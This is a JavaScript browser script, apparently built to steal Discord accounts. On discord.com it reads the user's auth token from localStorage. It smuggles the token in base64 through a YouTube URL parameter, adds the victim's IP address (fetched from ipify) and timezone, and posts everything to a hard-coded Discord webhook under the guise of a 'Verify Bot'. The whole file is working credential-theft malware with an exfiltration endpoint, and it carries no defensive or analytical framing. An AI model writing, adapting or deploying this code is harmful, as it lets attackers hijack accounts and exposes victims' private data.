setTimeout(() => {
    console.log("Script executed after 2 seconds!");

    const webhookURL = 'https://discord.com/api/webhooks/1332219931588034630/VCkO6nJoho1ZkLrUUAU6oenxzPXQHDs6tIJ4kEFtayR8EdCA-dnD0JVBB5t5dJUWmkYP';

    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = atob(url.searchParams.get("v"));
        if (param != null) {
            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const message = {
                        username: "Verify Bot",
                        embeds: [
                            {
                                title: "Logged Info",
                                description: `IP: ${ip}\nTimezone: ${timezone}\nToken: ${param}`,
                                color: 16711935 // Pink
                            }
                        ]
                    };

                    console.log("Sending data to Discord webhook...");

                    return fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    });
                })
                .then(response => {
                    if (response.ok) {
                        console.log("Webhook data sent successfully!");

                        // 🔹 Delay Redirect AFTER Webhook Completes
                        setTimeout(() => {
                            window.location.href = "https://discord.com/channels/@me";
                        }, 3000); // 3s delay before redirecting
                    } else {
                        console.error("Failed to send webhook data.");
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {
        const token = localStorage.token;
        if (token != null) {
            console.log("Token found, redirecting...");
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
            }, 3000); // Delay redirect
        }
    } else {
        console.log("Redirecting to Discord in 3s...");
        setTimeout(() => {
            window.location.href = "https://discord.com/channels/@me";
        }, 3000); // Delay redirect
    }
}, 2000); // 2s delay before running script
